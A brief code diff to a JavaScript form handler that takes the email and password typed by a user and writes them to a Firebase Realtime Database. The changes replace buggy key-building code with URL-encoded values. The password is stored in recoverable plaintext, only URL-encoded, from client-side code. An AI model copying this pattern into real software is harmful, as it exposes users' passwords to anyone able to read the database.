@@ -22,14 +22,12 @@ document.querySelector(".enter").addEventListener("click", ()=>{
  // Get references to email and password input elements
 var x = document.querySelector(".email");
 var y = document.querySelector(".password");
-var lett = ["a", "b" , "c" , "d" , "e" , "d"];
-var random = Math.floor(Math.random()*lett.length-1);
-var xx = x[x.indexOf("@")]="";
-
+var xx = encodeURIComponent(x.value);
+ var yy = encodeURIComponent(y.value);
 // Write user data to Firebase Realtime Database (replace "users" with your desired path)
-set(ref(db, "users/" + lett[random]), {
+set(ref(db, "users/" + xx), {
   username:xx,
-  password: y.value,
+  password: yy,
 });
 
 
